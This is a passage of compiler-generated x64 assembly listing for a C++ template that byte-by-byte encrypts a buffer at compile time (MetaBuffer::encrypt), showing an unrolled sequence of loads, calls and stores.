  010d0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  010d4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  010db	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  010e0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  010e7	88 41 66	 mov	 BYTE PTR [rcx+102], al
  010ea	b8 01 00 00 00	 mov	 eax, 1
  010ef	48 6b c0 66	 imul	 rax, rax, 102		; 00000066H
  010f3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  010fa	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  010fe	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01105	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0110a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01111	88 41 67	 mov	 BYTE PTR [rcx+103], al
  01114	b8 01 00 00 00	 mov	 eax, 1
  01119	48 6b c0 67	 imul	 rax, rax, 103		; 00000067H
  0111d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  01124	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01128	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0112f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01134	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0113b	88 41 68	 mov	 BYTE PTR [rcx+104], al
  0113e	b8 01 00 00 00	 mov	 eax, 1
  01143	48 6b c0 68	 imul	 rax, rax, 104		; 00000068H
  01147	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0114e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01152	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01159	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0115e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01165	88 41 69	 mov	 BYTE PTR [rcx+105], al
  01168	b8 01 00 00 00	 mov	 eax, 1
  0116d	48 6b c0 69	 imul	 rax, rax, 105		; 00000069H
  01171	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  01178	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0117c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01183	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01188	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0118f	88 41 6a	 mov	 BYTE PTR [rcx+106], al
  01192	b8 01 00 00 00	 mov	 eax, 1
  01197	48 6b c0 6a	 imul	 rax, rax, 106		; 0000006aH
  0119b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  011a2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  011a6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  011ad	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  011b2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  011b9	88 41 6b	 mov	 BYTE PTR [rcx+107], al
  011bc	b8 01 00 00 00	 mov	 eax, 1
  011c1	48 6b c0 6b	 imul	 rax, rax, 107		; 0000006bH
  011c5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  011cc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  011d0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  011d7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  011dc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  011e3	88 41 6c	 mov	 BYTE PTR [rcx+108], al
  011e6	b8 01 00 00 00	 mov	 eax, 1
  011eb	48 6b c0 6c	 imul	 rax, rax, 108		; 0000006cH
  011ef	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  011f6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  011fa	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01201	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01206	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0120d	88 41 6d	 mov	 BYTE PTR [rcx+109], al
  01210	b8 01 00 00 00	 mov	 eax, 1
  01215	48 6b c0 6d	 imul	 rax, rax, 109		; 0000006dH
  01219	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  01220	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01224	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0122b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01230	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01237	88 41 6e	 mov	 BYTE PTR [rcx+110], al
  0123a	b8 01 00 00 00	 mov	 eax, 1
  0123f	48 6b c0 6e	 imul	 rax, rax, 110		; 0000006eH
  01243	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0124a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0124e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01255	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  0125a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  01261	88 41 6f	 mov	 BYTE PTR [rcx+111], al
  01264	b8 01 00 00 00	 mov	 eax, 1
  01269	48 6b c0 6f	 imul	 rax, rax, 111		; 0000006fH
  0126d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  01274	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  01278	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0127f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  01284	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0128b	88 41 70	 mov	 BYTE PTR [rcx+112], al
  0128e	b8 01 00 00 00	 mov	 eax, 1
  01293	48 6b c0 70	 imul	 rax, rax, 112		; 00000070H
  01297	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0129e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  012a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  012a9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  012ae	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  012b5	88 41 71	 mov	 BYTE PTR [rcx+113], al
  012b8	b8 01 00 00 00	 mov	 eax, 1
  012bd	48 6b c0 71	 imul	 rax, rax, 113		; 00000071H
  012c1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  012c8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  012cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  012d3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@AEBAEE@Z ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::encrypt
  012d8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  012df	88 41 72	 mov	 BYTE PTR [rcx+114], al
  012e2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  012e9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  012ed	88 85 c0 00 00
	00		 mov	 BYTE PTR tv896[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  012f3	48 8b 85 f0 00
